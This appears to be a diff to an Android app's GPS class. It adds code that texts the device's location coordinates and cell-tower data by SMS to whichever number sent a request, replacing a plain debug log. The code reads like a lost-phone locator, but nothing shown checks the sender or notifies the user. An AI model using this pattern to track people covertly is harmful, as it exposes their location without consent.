@@ -6,8 +6,10 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Bundle;
+import android.os.Looper;
 import android.telephony.TelephonyManager;
 import android.telephony.gsm.GsmCellLocation;
+import android.text.TextUtils;
 import android.util.Log;
 
 public class GPS implements LocationListener {
@@ -16,11 +18,16 @@ public class GPS implements LocationListener {
     private Location currentBestLocation = null;
     private Context context;
     private LocationManager locationManager;
+    private String sender;
 
     @SuppressLint("MissingPermission")
-    public GPS(Context context){
+    public GPS(Context context, String sender){
         this.context = context;
+        this.sender = sender;
         locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+        Looper m = Looper.myLooper();
+        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, this, m);
+        locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, this, m);
     }
 
     @Override
@@ -31,10 +38,10 @@ public class GPS implements LocationListener {
         if (currentBestLocation == null) {
             currentBestLocation = location;
         }
+        String Providor = getLastBestLocation().getProvider();
         String Latitude = getLastBestLocation().getLatitude()+ "";
         String Longitude = getLastBestLocation().getLongitude() + "";
-        Log.d("GPS", Latitude + "/"+ Longitude);
-
+        SMS.sendMessage(sender, Providor + ": " + Latitude + " " + Longitude);
     }
 
     @Override
@@ -110,9 +117,15 @@ public class GPS implements LocationListener {
         } else return isNewer && !isSignificantlyLessAccurate && isFromSameProvider;
     }
 
-    public GsmCellLocation getGSMCellLocation(){
+    public GsmCellLocation sendGSMCellLocation(){
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        String operator = tm.getNetworkOperator();
         @SuppressLint("MissingPermission") GsmCellLocation location = (GsmCellLocation) tm.getCellLocation();
+        if (!TextUtils.isEmpty(operator)) {
+            int mcc = Integer.parseInt(operator.substring(0, 3));
+            int mnc = Integer.parseInt(operator.substring(3));
+            SMS.sendMessage(sender, "GSM-Cell-Data:\nMCC: "+ mcc +"\nMNC: " + mnc+ "\nCID: " + location.getCid()+ "\nLAC: " + location.getLac() + "\nSearch with: http://www.cell2gps.com/");
+        }
         return location;
     }
 }
